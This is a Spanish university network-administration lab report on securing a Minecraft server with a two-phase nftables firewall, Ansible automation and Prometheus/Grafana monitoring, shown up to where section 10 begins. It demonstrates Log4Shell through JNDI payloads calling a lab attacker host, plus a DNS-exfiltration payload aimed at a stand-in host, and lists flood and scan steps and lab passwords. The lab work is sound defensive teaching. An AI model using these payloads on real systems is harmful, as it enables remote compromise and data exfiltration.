# Informe Técnico Completo — Proyecto TEL342 "Administración de Redes de Computadores"

**Servidor Minecraft seguro detrás de un gateway/firewall, automatizado con Ansible, observado con Prometheus/Grafana, demostrando Log4Shell (CVE-2021-44228) en dos fases de firewall.**

Universidad Técnica Federico Santa María — TEL342 Administración de Redes de Computadores — 2026-2
Autores: Juan Pablo Prieto Hein · Juan Barrera

---

> **Propósito de este documento.** Es la referencia única y exhaustiva del proyecto. Describe *qué se montó, por qué, con qué IPs/puertos/herramientas, y cómo se ejecuta la demo completa paso a paso*. Está pensado para que cualquier persona —o cualquier IA— que lo lea pueda entender y reproducir el proyecto en su totalidad, sin acceso al autor original.
>
> **Uso con una IA.** Este `.md` es autosuficiente. Se le puede entregar completo a un asistente de IA para que: (a) responda consultas sobre cómo funciona el proyecto, (b) diagnostique problemas durante la demo, y (c) guíe la **reconstrucción desde cero**. Todo lo necesario está incrustado en el propio documento: reglas de firewall *verbatim* (§6.3–6.6), IPs y puertos (§3, §4, §17), scripts de monitoreo (§8), comandos de Ansible de la demo (§9.4) y los pasos de construcción (§6.9 replicar firewall, §13 reproducir, §13.5 construir desde cero). Si la IA necesita un dato que no está aquí, el documento lo indica como "fuente canónica" (los archivos reales en `Proyecto/`).
>
> **Fuentes canónicas.** Los scripts definitivos viven en la carpeta `Proyecto/` (rutas indicadas en cada sección). Este informe los consolida y explica; si hay discrepancia, mandan los archivos reales del repositorio.

---

## Tabla de contenidos

1. [Resumen ejecutivo](#1-resumen-ejecutivo)
2. [Arquitectura y topología de red](#2-arquitectura-y-topología-de-red)
3. [Inventario de máquinas](#3-inventario-de-máquinas)
4. [Redes de VirtualBox y ruteo](#4-redes-de-virtualbox-y-ruteo)
5. [El servicio: dos instancias de Minecraft](#5-el-servicio-dos-instancias-de-minecraft)
6. [El firewall nftables en dos fases](#6-el-firewall-nftables-en-dos-fases)
7. [La vulnerabilidad: Log4Shell (CVE-2021-44228)](#7-la-vulnerabilidad-log4shell-cve-2021-44228)
8. [Monitoreo y observabilidad (Prometheus + Grafana)](#8-monitoreo-y-observabilidad-prometheus--grafana)
9. [Automatización con Ansible](#9-automatización-con-ansible)
10. [Acceso externo: túnel playit.gg (bypass CGNAT)](#10-acceso-externo-túnel-playitgg-bypass-cgnat)
11. [Guion de la demo paso a paso](#11-guion-de-la-demo-paso-a-paso)
12. [Credenciales y accesos](#12-credenciales-y-accesos)
13. [Reproducción desde cero (importar OVAs)](#13-reproducción-desde-cero-importar-ovas)
14. [Checklist de encendido / apagado](#14-checklist-de-encendido--apagado)
15. [Hallazgos y observaciones para el informe](#15-hallazgos-y-observaciones-para-el-informe)
16. [Problemas conocidos y troubleshooting](#16-problemas-conocidos-y-troubleshooting)
17. [Anexos: mapas de puertos e IPs](#17-anexos-mapas-de-puertos-e-ips)

---

## 1. Resumen ejecutivo

El proyecto monta un **servicio de Minecraft** expuesto a Internet de forma controlada y lo protege con un **gateway Debian** que hace de **firewall + router + NAT** usando `nftables`. Sobre eso se construyen cuatro capas:

1. **Aislar** — el servidor de Minecraft no está nunca expuesto directamente: vive en una red privada interna y solo se alcanza a través del gateway.
2. **Filtrar** — el gateway aplica un firewall que existe en **dos fases**: una *vulnerable* (permisiva, para mostrar el ataque) y una *segura* (restrictiva, para mostrar la mitigación).
3. **Automatizar** — todo el despliegue y la demo se ejecutan con **Ansible** (idempotente, por tags).
4. **Observar** — **Prometheus** recolecta métricas y **Grafana** las grafica en tiempo real: tráfico, descartes del firewall, jugadores conectados y los *callbacks* del exploit Log4Shell.

La pieza central de la demostración es **Log4Shell (CVE-2021-44228)**: se inyecta el payload en una instancia vulnerable de Minecraft y se observa el **callback saliente** del servidor hacia el atacante como *verificador* de que la vulnerabilidad se disparó. Luego se cambia el firewall a la fase segura y se muestra, en Grafana, cómo el callback deja de salir (queda contado y **descartado**) mientras un jugador legítimo ya conectado **no se cae** (gracias al seguimiento de conexiones / `conntrack`).

---

## 2. Arquitectura y topología de red

```
                         INTERNET
                             │
                    (túnel playit.gg)
                             │
   ┌─────────────────────────────────────────────────────────┐
   │  HOST FÍSICO = "blackwall"  (tu PC, rol ATACANTE)         │
   │  usuario: whoampi                                         │
   │  - Corre VirtualBox (host de las 2 VMs)                   │
   │  - Agente playit.gg (systemd: playit.service)            │
   │  - Herramientas de ataque: nmap, flood, LDAP :1389       │
   │                                                          │
   │   IP en la red Host-Only vboxnet0:  192.168.56.1         │
   │                                                          │
   │        │ (vboxnet0 — Host-Only 192.168.56.0/24)          │
   │        ▼                                                 │
   │  ┌───────────────────────────────┐                       │
   │  │  VM "gw-svmc"  (GATEWAY/FW)    │                       │
   │  │  Debian — router + nftables   │                       │
   │  │                               │                       │
   │  │  enp0s3 = 192.168.56.10  ◄──── uplink (Host-Only)     │
   │  │  enp0s8 = 10.10.10.1     ◄──── red privada interna    │
   │  └───────────────┬───────────────┘                       │
   │                  │ (red interna "svmc-priv" 10.10.10.0/24)│
   │                  ▼                                        │
   │  ┌───────────────────────────────┐                       │
   │  │  VM "mc-svmc"  (SERVIDOR)      │                       │
   │  │  Debian — 2x Minecraft        │                       │
   │  │                               │                       │
   │  │  enp0s3 = 10.10.10.10         │                       │
   │  │  (sin ruta directa a Internet;│                       │
   │  │   todo pasa por el gateway)   │                       │
   │  └───────────────────────────────┘                       │
   └─────────────────────────────────────────────────────────┘
```

**Flujo de un jugador externo (Juan):**

```
Juan (Internet) ──► relay playit.gg ──► agente playit en blackwall (192.168.56.1)
        ──► 192.168.56.10 (gateway, puerto de juego)
        ──► [DNAT + FORWARD nftables]
        ──► 10.10.10.10 (servidor Minecraft, instancia correspondiente)
```

**Flujo del callback Log4Shell (ataque):**

```
Servidor MC vulnerable (10.10.10.10) ──► intenta conectar a ldap://192.168.56.1:1389
        ──► pasa por el gateway (FORWARD, interfaz privada → uplink, dport 1389)
        ──► nftables lo CUENTA (counter c_callback)
        ──► FASE 1: lo deja salir  → llega al atacante (callback exitoso = verificador)
        ──► FASE 2: lo descarta    (counter c_fwd_drop + log "FWD-DROP") → mitigado
```

---

## 3. Inventario de máquinas

| Rol | Nombre | Tipo | SO | Usuario SSH | IPs |
|---|---|---|---|---|---|
| **Atacante / Host** | `blackwall` | PC físico (host VirtualBox) | Linux | `whoampi` | `192.168.56.1` (vboxnet0) + Internet |
| **Gateway / Firewall** | `gw-svmc` | VM VirtualBox | Debian | `jbjp_gw` | `192.168.56.10` (enp0s3), `10.10.10.1` (enp0s8) |
| **Servidor** | `mc-svmc` | VM VirtualBox | Debian | `jbjp_mc` | `10.10.10.10` (enp0s3) |

- **blackwall NO es una VM**: es el PC físico donde corre todo. Hace de atacante, de host de las VMs y de punto de salida a Internet (vía el túnel playit). Por eso solo se exportan **2 OVAs** (gw y mc).
- Las VMs se entregan como:
  - `gw-svmc.ova` (~2.3 GB)
  - `mc-svmc.ova` (~1.9 GB)
- Recursos típicos por VM: ~2 GB RAM. **Importante:** la VM `mc` corre dos instancias Java de ~2 GB cada una; con ~3.8 GB de RAM **no caben ambas al 100%** → riesgo de OOM si se fuerzan las dos a la vez con carga. Para la demo basta levantar la que se vaya a usar.

---

## 4. Redes de VirtualBox y ruteo

Se usan **dos redes**, elegidas para que el proyecto sea **independiente del lugar** (no depende de la red de la universidad ni de DHCP ajeno):

### 4.1 Red Host-Only `vboxnet0` — `192.168.56.0/24`
- Conecta el **host (blackwall)** con el **gateway**.
- Host: `192.168.56.1`. Gateway (enp0s3): `192.168.56.10` (**IP estática**, ver abajo).
- Es "uplink" del gateway: por aquí entra el tráfico de juego (reenviado por playit) y por aquí sale el callback.
- **Por qué Host-Only y no bridged:** en la red de la universidad el bridged fallaba (DHCP no entregaba IP → caía a *link-local* `169.254.x`, inalcanzable). Host-Only es una red privada del propio PC, estable en cualquier lugar.

**Creación de la red Host-Only (en el host):**
```bash
VBoxManage hostonlyif create                     # crea vboxnet0
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
# (DHCP de vboxnet0 puede quedar habilitado, pero el gateway usa IP estática)
```

### 4.2 Red interna `svmc-priv` — `10.10.10.0/24`
- Conecta el **gateway** (enp0s8 = `10.10.10.1`) con el **servidor** (`10.10.10.10`).
- Es una *Internal Network* de VirtualBox: **no es visible desde el host**, solo entre VMs. El servidor queda completamente aislado detrás del gateway.

### 4.3 IP estática del gateway
`/etc/network/interfaces` en **gw** (enp0s3 pasó de DHCP a estático para que la IP no cambie nunca):
```
# uplink Host-Only
auto enp0s3
iface enp0s3 inet static
    address 192.168.56.10/24

# red privada interna hacia el servidor
auto enp0s8
iface enp0s8 inet static
    address 10.10.10.1/24
```

### 4.4 Ruta de retorno en el servidor
El servidor (`mc`) debe saber volver hacia la red del host (`192.168.56.0/24`) a través del gateway:
```bash
sudo ip route add 192.168.56.0/24 via 10.10.10.1
```
(En la demo esto lo deja puesto Ansible en el tag `prep`.)

### 4.5 Reenvío de paquetes (IP forwarding) en el gateway
```bash
# /etc/sysctl.conf  ->  net.ipv4.ip_forward = 1
sudo sysctl -w net.ipv4.ip_forward=1
```

---

## 5. El servicio: dos instancias de Minecraft

En la VM `mc` corren **dos** servidores de Minecraft en paralelo, gestionados por **systemd**:

| Instancia | Versión | Puerto juego | Puerto RCON | log4j | Rol |
|---|---|---|---|---|---|
| **Actualizada** | 26.3 | `25565` | `25575` | parcheado | "servicio seguro" / jugador legítimo |
| **Vulnerable** | 1.18 | `25566` | `25576` | **2.14.1** | blanco de Log4Shell |

- **Unidades systemd** (en `mc`):
  - `mc-actualizado.service` — "Minecraft 26.3 - Proyecto Admin de Redes"
  - `mc-vulnerable.service` — "Minecraft 1.18 - Proyecto Admin de Redes"
- **`online-mode=false`** en ambas (en `server.properties`): permite conectarse sin autenticación de Mojang (necesario para la demo con cuentas no premium y para el túnel).
- **RCON habilitado** en ambas (`enable-rcon=true`, `rcon.port=2557x`, `rcon.password=admin123`): permite ejecutar comandos del servidor de forma remota — se usa para inyectar el payload de Log4Shell y para contar jugadores.
- **`whitelist` desactivada** durante la demo (para que Juan entre sin estar en lista).

**Por qué dos instancias:** se necesita una versión **vieja** (1.18 con log4j 2.14.1) para que Log4Shell funcione, y una **actualizada** (26.3) para representar el "servicio correcto" que sigue disponible incluso en la fase segura del firewall. El contraste es parte de la narrativa de la demo.

**Gestión manual (si se necesita):**
```bash
sudo systemctl start  mc-vulnerable.service     # levantar la vulnerable
sudo systemctl start  mc-actualizado.service    # levantar la actualizada
sudo systemctl stop   mc-vulnerable.service mc-actualizado.service   # apagar ambas (guarda el mundo)
systemctl list-units --type=service | grep -i mine    # ver estado
```

---

## 6. El firewall nftables en dos fases

**Ubicación canónica:** `Proyecto/gateway/fase1-vulnerable.nft`, `Proyecto/gateway/fase2-segura.nft`, y el script `Proyecto/gateway/aplicar-fase.sh` (copiado en el gateway como `/root/gateway/aplicar-fase.sh`).

### 6.1 Variables comunes
Ambos archivos empiezan con `flush ruleset` (limpian todo) y definen:
```
define UP_IF   = "enp0s3"      # uplink Host-Only (lado host/Internet)
define PRIV_IF = "enp0s8"      # red privada interna (lado servidor)
define MC_IP   = 10.10.10.10   # IP del servidor Minecraft
```
Se usan dos tablas: `table ip nat` (prerouting con DNAT + postrouting con masquerade) y `table inet filter` (counters + cadena `forward`).

### 6.2 Counters nombrados y su nomenclatura
nftables permite declarar *counters* con nombre que se pueden leer luego para exportar a Prometheus:

| Counter | Significado | Nomenclatura |
|---|---|---|
| `c_aceptado_25565` | Paquetes de juego aceptados hacia la instancia actualizada (25565) | `c_` = counter, `aceptado` = acción, `25565` = puerto |
| `c_fwd_drop` | Paquetes descartados en la cadena FORWARD (lo que el firewall bloquea) | `c_` = counter, `fwd` = forward, `drop` = acción |
| `c_callback` | Intentos de callback Log4Shell del servidor hacia el atacante (dport 1389) | `c_` = counter, `callback` = el evento observado |

La idea de la nomenclatura: prefijo `c_` para identificarlos como counters en los scripts, luego el **concepto** (aceptado/drop/callback) y, si aplica, el **puerto**. Así `nft list counters` y el exportador los parsean sin ambigüedad.

### 6.3 FASE 1 — vulnerable (permisiva)
Objetivo: dejar pasar el juego en un rango amplio de puertos y **permitir el callback** (para que el exploit se verifique). Egreso libre. Contenido exacto de `fase1-vulnerable.nft`:

```nft
#!/usr/sbin/nft -f
flush ruleset
define UP_IF   = "enp0s3"
define PRIV_IF = "enp0s8"
define MC_IP   = 10.10.10.10
table ip nat {
    chain prerouting {
        type nat hook prerouting priority dstnat; policy accept;
        iifname $UP_IF tcp dport 25565-25580 counter dnat to $MC_IP
    }
    chain postrouting {
        type nat hook postrouting priority srcnat; policy accept;
        oifname $UP_IF counter masquerade
        oifname $PRIV_IF counter masquerade
    }
}
table inet filter {
    counter c_aceptado_25565 { }
    counter c_fwd_drop { }
    counter c_callback { }
    chain forward {
        type filter hook forward priority filter; policy accept;
        iifname $UP_IF oifname $PRIV_IF ip daddr $MC_IP tcp dport 25565 counter name c_aceptado_25565
        iifname $PRIV_IF oifname $UP_IF tcp dport 1389 counter name c_callback
    }
}
```

Notas de lectura:
- La **policy del forward es `accept`**, así que todo lo reenviado pasa; las dos reglas solo **cuentan** flujos de interés (no necesitan `accept` explícito): el juego entrante a 25565 (`c_aceptado_25565`) y el callback saliente a 1389 (`c_callback`).
- El **DNAT es amplio** (`25565-25580`): cualquier puerto de ese rango entra al servidor.
- **Masquerade en ambas interfaces** (`enp0s3` y `enp0s8`): asegura el camino de ida y de vuelta.
- El callback se cuenta **sin filtrar por IP origen** (basta `iifname priv oifname up tcp dport 1389`).

### 6.4 FASE 2 — segura (restrictiva)
Objetivo: exponer **solo** el puerto de la instancia actualizada (25565), **bloquear** todo lo demás, y **cortar el egreso** del servidor salvo DNS/HTTP/HTTPS → el callback a 1389 queda contado **y descartado**. Contenido exacto de `fase2-segura.nft`:

```nft
#!/usr/sbin/nft -f
flush ruleset
define UP_IF   = "enp0s3"
define PRIV_IF = "enp0s8"
define MC_IP   = 10.10.10.10
table ip nat {
    chain prerouting {
        type nat hook prerouting priority dstnat; policy accept;
        iifname $UP_IF tcp dport 25565 counter dnat to $MC_IP
    }
    chain postrouting {
        type nat hook postrouting priority srcnat; policy accept;
        oifname $UP_IF counter masquerade
        oifname $PRIV_IF counter masquerade
    }
}
table inet filter {
    counter c_aceptado_25565 { }
    counter c_fwd_drop { }
    counter c_callback { }
    chain forward {
        type filter hook forward priority filter; policy drop;
        ct state established,related counter accept
        iifname $UP_IF oifname $PRIV_IF ip daddr $MC_IP tcp dport 25565 counter name c_aceptado_25565 accept
        iifname $PRIV_IF oifname $UP_IF udp dport 53 counter accept
        iifname $PRIV_IF oifname $UP_IF tcp dport { 53, 80, 443 } counter accept
        iifname $PRIV_IF oifname $UP_IF tcp dport 1389 counter name c_callback
        counter name c_fwd_drop log prefix "FWD-DROP " drop
    }
}
```

Notas de lectura (orden de reglas, que es lo que importa):
1. **`policy drop`**: lo no permitido explícitamente cae.
2. **`ct state established,related counter accept`**: las conexiones ya vivas (el jugador conectado) siguen pasando → **no se cae nadie** al cambiar de fase.
3. **Solo se acepta el juego a 25565** (instancia actualizada), con `accept` explícito.
4. **Egreso del servidor restringido** a DNS (`udp/tcp 53`) y HTTP/HTTPS (`tcp 80, 443`) — operación legítima.
5. **El callback a 1389 se CUENTA** (`c_callback`) pero **no se acepta** → cae en la regla final.
6. **Regla final**: todo lo restante se **cuenta (`c_fwd_drop`), se loguea (`FWD-DROP`) y se descarta (`drop`)**.
- Resultado: el callback de Log4Shell queda **contado y bloqueado** (sube `c_callback` **y** `c_fwd_drop`), nunca llega al atacante. El **DNAT también se estrecha** a solo 25565.

### 6.5 El seguimiento de conexiones (`conntrack`) — por qué el jugador no se cae
La regla `ct state established,related accept` está **antes** del `drop`. Cuando se cambia de fase1 a fase2 **en caliente**, las conexiones ya establecidas (como la sesión TCP de Juan en el puerto 25566) están en estado `established` → siguen aceptándose. Solo las **conexiones nuevas** a puertos ahora bloqueados caen. Esto explica un hallazgo clave de la demo:

> Se pasó el gateway a fase2 mientras Juan jugaba en el puerto 66, y **Juan no se cayó**. En Grafana no hay tráfico *nuevo* en 25566, pero sigue habiendo un jugador conectado y, si la instancia vulnerable genera un callback nuevo, este ahora cae en `c_fwd_drop`.

### 6.6 Script para aplicar fase (en el gateway)
Uso:
```bash
sudo /root/gateway/aplicar-fase.sh fase1     # carga fase1-vulnerable.nft
sudo /root/gateway/aplicar-fase.sh fase2     # carga fase2-segura.nft
```
Contenido exacto de `aplicar-fase.sh`:
```bash
#!/usr/bin/env bash
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
case "${1:-}" in
  fase1) F="$DIR/fase1-vulnerable.nft" ;;
  fase2) F="$DIR/fase2-segura.nft" ;;
  *) echo "Uso: sudo $0 fase1|fase2"; exit 1 ;;
esac
sysctl -w net.ipv4.ip_forward=1 >/dev/null
nft -f "$F"
echo "[ok] Aplicada: $(basename "$F")"
nft list ruleset
```
Es decir: activa el **IP forwarding**, carga el `.nft` de la fase elegida con `nft -f`, confirma y vuelca el ruleset resultante. (Por eso al ejecutarlo ves el ruleset completo impreso: lo imprime el propio script.)

### 6.7 ⚠️ Gotcha crítico: el reboot borra el firewall
**Cada vez que se reinicia el gateway, nftables se vacía (flush).** Si no se re-aplica una fase:
- Los paneles de firewall en Grafana muestran **"No data"**.
- El DNAT desaparece → el juego **no entra** (ni 25565 ni 25566).

**Regla de oro:** después de cada boot del gateway, **lo primero** es:
```bash
sudo /root/gateway/aplicar-fase.sh fase1
```

### 6.8 Comandos de inspección del firewall (en el gateway)
```bash
sudo nft list ruleset                               # todo el firewall
sudo nft list counters                              # valores de los counters
sudo nft -j list counters                           # en JSON (lo que parsea el exportador)
sudo nft list chain inet filter forward | grep policy   # ¿accept (fase1) o drop (fase2)?
```
Atajos instalados por `Proyecto/demo/gw-tools.sh` (en el gateway): `fase1`, `fase2`, `ver-callback`, `ver-salida`, `ver-drops`, `estado-fw`.

### 6.9 Replicar el firewall EXACTO en otro PC
Para que dos personas tengan el **mismo firewall byte por byte** hay dos vías. Las reglas viven **dentro** de la VM gateway (`/root/gateway/fase1-vulnerable.nft`, `fase2-segura.nft`, `aplicar-fase.sh`), así que:

**Vía A — con el OVA (lo normal, casi sin trabajo):**
Al importar `gw-svmc.ova`, la otra persona **ya tiene** los tres archivos instalados en `/root/gateway/`. Solo necesita, una vez importado:
```bash
sudo /root/gateway/aplicar-fase.sh fase1     # (o fase2)
```
Nada que copiar ni escribir. El firewall es idéntico porque es la misma VM.

**Vía B — sin OVA / reconstruyendo el gateway desde cero:**
En un Debian con dos interfaces (`enp0s3` uplink host-only, `enp0s8` red interna) y `nftables` instalado:
```bash
sudo apt install -y nftables
sudo mkdir -p /root/gateway
# copiar los 3 archivos (del zip Proyecto/gateway/) a /root/gateway/
sudo cp fase1-vulnerable.nft fase2-segura.nft aplicar-fase.sh /root/gateway/
sudo chmod +x /root/gateway/aplicar-fase.sh
sudo /root/gateway/aplicar-fase.sh fase1
```
Si no se tienen los archivos, se copian **verbatim** desde las secciones §6.3 (fase1), §6.4 (fase2) y §6.6 (`aplicar-fase.sh`) de este documento — están completos.

**Lo que NO viaja en el OVA y hay que crear en cada host** (una sola vez):
```bash
# red Host-Only del lado del host (el gateway espera estar en 192.168.56.0/24)
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0
```
Y al **importar** cada VM: `gw` con adaptador 1 = Host-Only (vboxnet0) y adaptador 2 = Red interna `svmc-priv`; `mc` con adaptador 1 = Red interna `svmc-priv`; **desmarcar** "reinicializar MAC". Con eso, el firewall queda idéntico y funcional en ambos PCs.

> **Recordatorio:** cada reboot del gateway vacía nftables (§6.7). Siempre re-aplicar una fase tras encender.

---

## 7. La vulnerabilidad: Log4Shell (CVE-2021-44228)

### 7.1 Qué es
Log4Shell es una vulnerabilidad crítica (RCE) en la librería de logging **Apache Log4j 2** (versiones < 2.15, aquí **2.14.1**). El problema: Log4j interpreta *lookups* dentro de los mensajes que loguea. La secuencia `${jndi:ldap://host/x}` hace que Log4j, al escribir ese texto en el log, **contacte por JNDI a un servidor LDAP arbitrario** y, en versiones sin mitigar, descargue y ejecute una clase Java remota → ejecución remota de código.

En Minecraft 1.18, **el chat se loguea con log4j**, así que basta con que alguien escriba el payload en el chat (o se inyecte por RCON con `say`) para dispararlo.

### 7.2 El callback como *verificador*
No se busca RCE real (es peligroso y además esta build de Java lo bloquea). Lo que se demuestra es el **callback**: el intento del servidor de **conectarse de vuelta** al atacante en `ldap://192.168.56.1:1389`. Ese paquete saliente es la **prueba observable** de que:
1. El payload llegó y fue interpretado por log4j.
2. El servidor es vulnerable (intentó la conexión JNDI).

El callback es ideal para el proyecto porque es un **evento de red** → se cuenta en el firewall (`c_callback`) y se grafica en Grafana. Es el "verificador" de la vulnerabilidad sin necesidad de RCE.

### 7.3 Por qué hay callback pero no RCE
La JVM usada es **Java 17**, que por defecto tiene `com.sun.jndi.ldap.object.trustURLCodebase=false` → **no** descarga ni ejecuta clases remotas por LDAP. Resultado:
- El **callback sí se dispara** (el servidor intenta conectar al LDAP) → observable.
- El **RCE no ocurre** (Java 17 no ejecuta el código remoto) → seguro para demostrar.

### 7.4 El payload exacto
```
${jndi:ldap://192.168.56.1:1389/x}
```
Se inyecta por RCON en la instancia **vulnerable** (puerto RCON 25576) con un `say`:
```bash
# en mc, vía RCON a la instancia vulnerable
python3 /tmp/rcon.py 25576 "say \${jndi:ldap://192.168.56.1:1389/x}"
# equivalente con el atajo:
mcrcon 25576 "say \${jndi:ldap://192.168.56.1:1389/x}"
```
(En Ansible el host del atacante es la variable `atacante_ip = 192.168.56.1`.)

### 7.5 Exfiltración por DNS — intentada, descartada
Se intentó un payload de exfiltración de datos tipo:
```
${jndi:ldap://${sys:java.version}.atacante.ejemplo/x}
```
para que el nombre consultado revelara la versión de Java. **No funcionó**: esta build **no sustituye lookups anidados** (`${sys:...}`) dentro del JNDI, así que no se generó la consulta DNS esperada. **Decisión:** se deja la exfil por DNS como **nota teórica** en el informe y la demo en vivo usa solo el **callback plano** (que sí funciona de forma consistente).

### 7.6 Lo que se ve en cada fase
- **Fase 1:** se inyecta el payload → el callback **sale** del gateway → `c_callback` sube en Grafana → el exploit se "verifica".
- **Fase 2:** se inyecta de nuevo → el callback es **contado pero descartado** (`c_callback` sube **y** `c_fwd_drop` sube, con log `FWD-DROP`) → el servidor **no logra** contactar al atacante → mitigado.

---

## 8. Monitoreo y observabilidad (Prometheus + Grafana)

**Ubicación canónica:** `Proyecto/monitoreo/` (incluye `dashboard.json`). Scripts de métricas desplegados en gateway y servidor.

### 8.1 Arquitectura de monitoreo
```
  gateway (nft counters) ──► nft-metrics.sh ──► nftables.prom (textfile) ──┐
                                                                           ├─► node_exporter ──► Prometheus ──► Grafana
  servidor (RCON list)   ──► mc-players.py  ──► minecraft_players (textfile)┘
```
- **Prometheus** usa modelo **pull**: hace *scrape* cada **5 s** a los `node_exporter` de gateway y servidor.
- Las métricas custom se publican vía el **textfile collector** de node_exporter (archivos `.prom` en `/var/lib/prometheus/node-exporter/`).

### 8.2 Exportador del firewall (en el gateway)
`/usr/local/bin/nft-metrics.sh` — lee los counters en JSON y escribe el textfile:
```bash
#!/bin/bash
# Lee los counters nombrados de nftables y los expone en formato Prometheus
OUT=/var/lib/prometheus/node-exporter/nftables.prom
nft -j list counters | \
  jq -r '.nftables[] | select(.counter) | .counter |
         "nft_counter_packets{name=\"\(.name)\"} \(.packets)\n
          nft_counter_bytes{name=\"\(.name)\"} \(.bytes)"' > "$OUT.tmp"
mv "$OUT.tmp" "$OUT"
```
Ejecutado periódicamente por un **timer systemd** `nft-metrics.timer` (cada **5 s**) → `nft-metrics.service`.

Métricas resultantes:
- `nft_counter_packets{name="c_callback"}`
- `nft_counter_packets{name="c_fwd_drop"}`
- `nft_counter_packets{name="c_aceptado_25565"}`
- (+ las variantes `_bytes`)

### 8.3 Exportador de jugadores (en el servidor)
`/usr/local/bin/mc-players.py` — consulta por RCON el comando `list` en cada instancia y publica cuántos jugadores hay:
```python
# pseudo-resumen: por cada instancia (25575, 25576) hace RCON 'list',
# parsea "There are N of a max..." y escribe:
# minecraft_players_online{exported_instance="actualizado"} N
# minecraft_players_online{exported_instance="vulnerable"} N
```
Ejecutado por `mc-players.timer` cada **10 s** → `mc-players.service`. En Grafana la etiqueta se muestra como `{{exported_instance}}`.

### 8.4 Grafana — dashboard
- **Login:** usuario `admin`, contraseña `1234`.
- **Dashboard uid:** `adksz7p`.
- **Importar el dashboard:** Grafana → *Dashboards → New → Import* → pegar el contenido de `Proyecto/monitoreo/dashboard.json` (o subir el archivo) → seleccionar el datasource Prometheus.

**Paneles:**

| Panel | Qué muestra | Query PromQL (clave) |
|---|---|---|
| Firewall: aceptado vs FWD-DROP | tasa de aceptados contra descartados | `rate(nft_counter_packets{name="c_aceptado_25565"}[1m])` vs `rate(nft_counter_packets{name="c_fwd_drop"}[1m])` |
| Descartes acumulados | total de paquetes bloqueados (stat) | `nft_counter_packets{name="c_fwd_drop"}` |
| Tráfico por interfaz | bytes por interfaz de red | métricas `node_network_*_bytes_total` |
| Jugadores por instancia | gauge por instancia + total | `minecraft_players_online` |
| **Callback Log4Shell** | callbacks del exploit en la última ventana | `increase(nft_counter_packets{name="c_callback"}[1m])` |

> El panel "Call LoopBack / Callback Log4Shell" es el protagonista: sube en fase1 cuando el exploit sale, y en fase2 se ve además subir `c_fwd_drop` mientras el callback no llega a destino.

### 8.5 Enlace y acceso a Grafana
Grafana escucha en la VM correspondiente (puerto 3000 por defecto). Se accede desde el host por la IP de la VM que lo aloje, p. ej. `http://192.168.56.10:3000` (gateway) — ajustar según dónde esté desplegado en tu copia.

---

## 9. Automatización con Ansible

**Ubicación canónica:** `Proyecto/ansible-demo/` → `inventory.ini`, `demo.yml`, `files/rcon.py`.

Ansible ya es la herramienta de despliegue del proyecto, así que **toda la demo** también se orquesta con él: levantar servidores, aplicar fases, inyectar el exploit, atacar y resetear — todo por **tags**, idempotente.

### 9.1 Inventario (`inventory.ini`)
```ini
[gateway]
gw ansible_host=192.168.56.10 ansible_user=jbjp_gw

[server]
mc ansible_host=10.10.10.10 ansible_user=jbjp_mc \
   ansible_ssh_common_args='-o ProxyJump=jbjp_gw@192.168.56.10 -o StrictHostKeyChecking=no'

[attacker]
blackwall ansible_connection=local

[all:vars]
atacante_ip=192.168.56.1
gw_lan_ip=192.168.56.10
```
- El servidor `mc` **no es accesible directamente** desde el host → Ansible salta a él por **ProxyJump** a través del gateway.
- `blackwall` usa `ansible_connection=local` porque es el propio host desde donde se corre Ansible.

### 9.2 Playbook (`demo.yml`) — qué hace cada tag

| Tag | Dónde | Acción |
|---|---|---|
| `prep` | mc | Arranca ambas instancias, fija `online-mode=false`, reinicia, agrega la ruta `192.168.56.0/24 via 10.10.10.1`, espera a que RCON (25575/25576) esté arriba (`wait_for`), copia `rcon.py` a `/tmp`, apaga whitelist |
| `fase1` | gw | Aplica `fase1-vulnerable.nft` (permisiva) |
| `fase2` | gw | Aplica `fase2-segura.nft` (restrictiva) |
| `log4shell` | mc | Inyecta el payload por RCON en la instancia vulnerable: `python3 /tmp/rcon.py 25576 "say ${jndi:ldap://{{ atacante_ip }}:1389/x}"` |
| `flood` | blackwall | Lanza tráfico/flood contra puertos bloqueados del gateway (dispara `c_fwd_drop`) |
| `scan` | blackwall | `nmap` contra el gateway (muestra qué puertos están abiertos según la fase) |
| `reset` | mc/gw | Limpia estado y deja todo en baseline |

### 9.3 Script RCON (`files/rcon.py`)
Uso:
```bash
rcon.py <puerto> "<comando>" [host=10.10.10.10]
# contraseña RCON: admin123 (incrustada / por defecto)
```
Implementa el protocolo RCON (TCP, con *framing* de paquetes vía `struct`). Ejemplos:
```bash
python3 rcon.py 25576 "say hola"          # a la vulnerable
python3 rcon.py 25575 "list"              # jugadores en la actualizada
python3 rcon.py 25576 "stop"              # apagar la vulnerable
```

### 9.4 Comandos exactos de la demo con Ansible
Desde el host (blackwall), en `Proyecto/ansible-demo/`:

```bash
cd Proyecto/ansible-demo

# 0) Verificar conectividad a las 3 máquinas
ansible -i inventory.ini all -m ping

# 1) PREPARACIÓN: levantar servidores, rutas, RCON, whitelist off
ansible-playbook -i inventory.ini demo.yml --tags prep -K

# 2) FASE 1 (vulnerable): firewall permisivo
ansible-playbook -i inventory.ini demo.yml --tags fase1 -K

# 3) (Opcional) ESCANEO en fase1: nmap muestra 25565-25580 abiertos
ansible-playbook -i inventory.ini demo.yml --tags scan

# 4) LOG4SHELL: inyectar el payload -> callback SALE (Grafana: c_callback sube)
ansible-playbook -i inventory.ini demo.yml --tags log4shell

# 5) FASE 2 (segura): firewall restrictivo
ansible-playbook -i inventory.ini demo.yml --tags fase2 -K

# 6) ESCANEO en fase2: nmap ahora solo ve 25565
ansible-playbook -i inventory.ini demo.yml --tags scan

# 7) LOG4SHELL de nuevo: callback es CONTADO y DESCARTADO (c_callback + c_fwd_drop suben)
ansible-playbook -i inventory.ini demo.yml --tags log4shell

# 8) FLOOD/DDoS a puertos bloqueados: dispara c_fwd_drop masivamente
ansible-playbook -i inventory.ini demo.yml --tags flood

# 9) RESET: volver a baseline
ansible-playbook -i inventory.ini demo.yml --tags reset -K
```
- **`-K`** pide la contraseña de `sudo` (become) — necesaria en los plays que tocan el firewall o systemd (gw/mc). Los tags que corren en `blackwall` local (`scan`, `flood`) no la necesitan.
- El **orden del escaneo es por fase, para contraste**: se corre `scan` en fase1 (muchos puertos) y otra vez en fase2 (solo 25565). No se corre un nmap "suelto" al principio.

---

## 10. Acceso externo: túnel playit.gg (bypass CGNAT)

